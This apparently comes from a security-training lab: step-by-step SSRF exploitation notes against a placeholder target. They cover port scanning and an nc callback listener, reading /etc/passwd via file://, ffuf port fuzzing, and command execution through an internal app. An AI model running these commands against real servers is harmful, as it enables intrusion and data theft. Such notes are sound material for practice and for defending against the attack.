SSRF Exploitation Example


Nmap - Discovering Open Ports
nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>

Curl - Interacting with the Target
curl -i -s http://<TARGET IP>   follow redirect curl -i -s -L http://<TARGET IP>

Test for SSRF
setup nc listener: nc -nvlp 8080
curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"

Look for response on nc 
EXAMPLE:
Connection received on <TARGET IP> 49852
GET / HTTP/1.1
Accept-Encoding: identity
Host: <VPN/TUN Adapter IP>:8080
User-Agent: Python-urllib/3.8
Connection: close

Setup index.html 
<html>
</body>
<a>SSRF</a>
<body>
<html>

In same folder start python HTTP server :python3 -m http.server 9090
Also start twisted ftp in same folder: sudo python3 -m twisted ftp -p 21 -r .
Get file from FTP: curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"
Retrieve file through target app-HTTP Schema: curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"

Open local files on target: curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd" 

Make wordlist for fuzzing open ports:
 for port in {1..65535};do echo $port >> ports.txt;done

ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30

interact with open ports you find:
curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000"
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"

